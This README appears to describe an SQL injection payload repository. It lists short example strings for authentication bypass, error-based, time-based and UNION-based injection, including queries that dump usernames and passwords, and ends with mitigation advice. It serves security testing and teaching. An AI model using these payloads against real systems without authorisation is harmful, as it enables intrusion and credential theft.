# SQL Payload List

This repository contains a comprehensive collection of SQL payloads categorized for various SQL injection (SQLi) scenarios. These payloads are designed for security testing purposes and to help identify vulnerabilities in web applications.

## ‚ö†Ô∏è Disclaimer

This repository is intended for **ethical security testing and educational purposes only**. Unauthorized use of these payloads against systems without explicit permission is illegal and unethical. The authors of this repository do not take responsibility for misuse.

## üìÇ Categories of Payloads

### 1. **Auth Bypass Payloads**
These payloads are designed to test authentication mechanisms for vulnerabilities that allow bypassing login screens.

Examples:
```sql
' OR 1=1 --
' OR '1'='1'
admin' --
```

---

### 2. **Error-Based SQLi Payloads**
Error-based SQL injection exploits database error messages to extract information about the database structure.

Examples:
```sql
' AND 1=CONVERT(int, (SELECT @@version)) --
' OR (SELECT 1/0) --
```

---

### 3. **SQL Injection Payloads**
General-purpose SQL injection payloads to test various SQLi vulnerabilities.

Examples:
```sql
' OR 1=1 --
' UNION SELECT NULL,NULL,NULL --
```

---

### 4. **Time-Based SQLi Payloads**
Time-based SQL injection uses conditional delays (e.g., `SLEEP`) to infer true/false outcomes.

Examples:
```sql
' OR IF(1=1, SLEEP(5), 0) --
' OR BENCHMARK(1000000, MD5(1)) --
```

---

### 5. **Union Select Payloads**
Union-based SQL injection retrieves data by combining multiple SELECT statements.

Examples:
```sql
' UNION SELECT username, password FROM users --
' UNION SELECT NULL, CONCAT(username, ':', password) FROM users --
```

---

## üí° Usage

1. **Testing**: Use these payloads to test SQL injection vulnerabilities in a controlled and authorized environment.
2. **Learning**: Understand how different types of SQLi work and how to prevent them.
3. **Development**: Help developers and security professionals identify weak points in their systems.

---

## üõ†Ô∏è Mitigation Techniques

To protect against SQL injection attacks:
1. Use **parameterized queries** or **prepared statements**.
2. Implement robust **input validation**.
3. Use **ORMs** (Object Relational Mappers) to abstract direct SQL queries.
4. Keep your database systems and libraries **up-to-date**.
5. Employ **WAFs** (Web Application Firewalls) to monitor and block malicious payloads.
